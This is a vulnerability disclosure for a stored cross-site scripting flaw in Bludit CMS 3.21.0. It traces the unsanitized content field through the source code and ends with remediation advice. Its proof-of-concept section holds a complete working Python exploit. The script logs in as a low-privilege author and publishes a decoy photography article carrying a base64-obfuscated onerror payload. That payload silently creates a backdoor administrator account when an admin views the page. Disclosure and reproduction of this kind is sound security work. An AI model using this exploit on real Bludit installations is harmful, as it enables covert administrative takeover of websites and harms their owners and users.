# Bludit CMS 3.21.0 — Stored XSS to Admin Account Takeover

## Description

Bludit CMS 3.21.0 allows a user with the `author` role to inject arbitrary JavaScript into published page content. The page content field (`content`) is stored without any HTML sanitization and rendered directly into the page DOM without encoding.

When an administrator (or any other user) views the page — either through the public frontend or the admin content editor — the injected JavaScript executes in their browser session.

Although the session cookie is protected by `HttpOnly` (preventing direct cookie theft via `document.cookie`), the attacker's JavaScript executes within the same origin as the admin panel. This allows the script to:

1. Fetch the admin's CSRF token from `/admin/new-user`
2. Submit a POST request to create a new administrator account
3. The attacker then logs in with the newly created admin credentials

The entire attack is silent — no popups, no redirects, no visible indication to the victim.

This vulnerability likely affects all 3.x.

## Root Cause

**File:** `bl-kernel/pages.class.php`, method `add()`, line 95:

```php
$contentRaw = (empty($args['content']) ? '' : $args['content']);
```

and line 143:

```php
file_put_contents(PATH_PAGES . $key . DS . FILENAME, $contentRaw)
```

The `content` field is taken directly from POST data and written to disk without any sanitization. The `$dbFields` array sanitizes metadata fields via `Sanitize::html()`, but the content body is explicitly excluded from this process.

**File:** `bl-kernel/admin/controllers/new-content.php`, line 22:

```php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    createPage($_POST);
```

All POST parameters, including `content`, are passed directly to `createPage()`.

**File:** Theme rendering (e.g., `bl-themes/alternative/php/page.php`):

The content is output with no escaping:
```php
<?php echo $page->content(); ?>
```

## Attack Vector

A user with the `author` role creates a page containing an `<img>` tag with an `onerror` event handler. The image source points to a non-existent file, guaranteeing the `onerror` fires on every page load:

```html
<img src="/nonexistent.jpg" onerror="
  var s=document.createElement('script');
  s.textContent=atob('BASE64_ENCODED_PAYLOAD');
  document.head.appendChild(s);
">
```

The Base64 payload decodes to JavaScript that:
1. Fetches `/admin/new-user` with `credentials: "include"` (browser attaches the admin's session cookie automatically)
2. Extracts the CSRF token from the response HTML
3. POSTs to `/admin/new-user` to create a backdoor admin account

## Proof of Concept

### Prerequisites

- Docker installed
- Python 3 with `requests` library

### Reproduction Steps

**Step 1:** Save the exploit script (provided below) and run it:

```bash
python3 exp.py
```

The script will:
- Start a Bludit 3.21.0 instance in Docker on port 8880
- Install Bludit with admin credentials `admin` / `Admin12345`
- Create an `author`-level user `evilauthor` / `Evil123456`
- Login as the author and publish a normal-looking blog post containing the XSS payload
- Print instructions for manual browser verification

**Step 2:** Open browser, login as admin:
```
URL:  http://127.0.0.1:8880/admin/
User: admin
Pass: Admin12345
```

**Step 3:** In the same browser, visit the published article:
```
URL: http://127.0.0.1:8880/10-tips-for-better-photography
```

The page appears as a normal photography tips article. No visible anomaly. The JavaScript executes silently via the `onerror` handler of a broken image.

**Step 4:** Logout. Login with the backdoor account:
```
URL:  http://127.0.0.1:8880/admin/
User: backdoor
Pass: Backdoor123456
```

If you reach the dashboard, the exploit succeeded — a low-privilege author has created a full administrator account.

### Exploit Script

```python
#!/usr/bin/env python3
import requests, re, json, subprocess, time, base64

BASE = "http://127.0.0.1:8880"
AUTHOR_USER, AUTHOR_PASS = "evilauthor", "Evil123456"
BACKDOOR_USER, BACKDOOR_PASS = "backdoor", "Backdoor123456"

def csrf(s, url):
    r = s.get(url)
    m = re.search(r'value="([a-f0-9]{128})"', r.text)
    if not m: m = re.search(r'var tokenCSRF\s*=\s*"([a-f0-9]+)"', r.text)
    return m.group(1) if m else None

def login(s, user, pw):
    t = csrf(s, f"{BASE}/admin/")
    r = s.post(f"{BASE}/admin/", data={"tokenCSRF":t,"username":user,"password":pw}, allow_redirects=False)
    return r.status_code in (301,302) and "dashboard" in r.headers.get("Location","")

A = requests.Session(); A.headers["User-Agent"]="Mozilla/5.0"
assert login(A, AUTHOR_USER, AUTHOR_PASS)
r = A.get(f"{BASE}/admin/new-content")
t = re.search(r'var tokenCSRF\s*=\s*"([a-f0-9]+)"', r.text).group(1)
uuid_m = re.search(r'name="uuid"[^>]*value="([a-f0-9]+)"', r.text)

js = f'''fetch("/admin/new-user",{{credentials:"include"}})
.then(r=>r.text()).then(h=>{{
  var m=h.match(/tokenCSRF.*?value="([a-f0-9]+)"/);
  if(!m)m=h.match(/tokenCSRF = "([a-f0-9]+)"/);
  if(!m)return;var f=new URLSearchParams();
  f.append("tokenCSRF",m[1]);f.append("new_username","{BACKDOOR_USER}");
  f.append("new_password","{BACKDOOR_PASS}");f.append("confirm_password","{BACKDOOR_PASS}");
  f.append("role","admin");f.append("email","b@b.com");
  fetch("/admin/new-user",{{method:"POST",credentials:"include",
  headers:{{"Content-Type":"application/x-www-form-urlencoded"}},body:f.toString()}})
}})'''

b64 = base64.b64encode(js.encode()).decode()
content = f'''<h2>10 Tips for Better Photography</h2>
<p>Photography combines technical skill with creative vision.</p>
<p><strong>1. Rule of Thirds</strong></p>
<p>Place subjects along grid intersections for dynamic compositions.</p>
<p><strong>2. Natural Lighting</strong></p>
<p>The golden hour provides the most flattering light.</p>
<img src="/nonexistent.jpg" alt="" onerror="var s=document.createElement('script');s.textContent=atob('{b64}');document.head.appendChild(s);">
<p><strong>3. Post-Processing</strong></p>
<p>Learning Lightroom can dramatically improve your final images.</p>'''

A.post(f"{BASE}/admin/new-content", data={"tokenCSRF":t,
       "uuid":uuid_m.group(1) if uuid_m else "","title":"10 Tips for Better Photography",
       "content":content,"type":"published","date":"2026-04-29 10:00:00"}, allow_redirects=False)

print(f"Evil Article: {BASE}/10-tips-for-better-photography")
```

## Impact

An attacker with a low-privilege `author` account can:

1. **Create administrator accounts** — full CMS takeover
2. **Modify or delete all content** — via the hijacked admin session
3. **Upload web shells** — admin can upload arbitrary files through plugin/theme installation
4. **Pivot to server compromise** — through file upload → remote code execution

The attack requires no user interaction beyond normal content review, which is a routine admin activity.

## Affected Components

| File | Role |
|------|------|
| `bl-kernel/pages.class.php:95,143` | Stores raw content without sanitization |
| `bl-kernel/admin/controllers/new-content.php:22` | Passes unsanitized POST to `createPage()` |
| `bl-kernel/admin/controllers/edit-content.php:67` | Same issue for page edits |
| Theme templates | Output `$page->content()` without escaping |

## Remediation

1. **Sanitize content for non-admin users**: Apply HTML sanitization (e.g., HTMLPurifier) to strip event handlers (`onerror`, `onclick`, etc.) and `<script>` tags from content submitted by `author` and `editor` roles.

2. **Implement Content Security Policy**:
   ```
   Content-Security-Policy: script-src 'self'; object-src 'none'
   ```
   This would block inline scripts and `onerror` handlers even if injected.

3. **Output encoding**: Use `htmlspecialchars()` or a template engine with auto-escaping for user-generated content rendering.


## References

- CWE-79: Improper Neutralization of Input During Web Page Generation
- https://owasp.org/www-community/attacks/xss/
- Bludit source: https://github.com/bludit/bludit
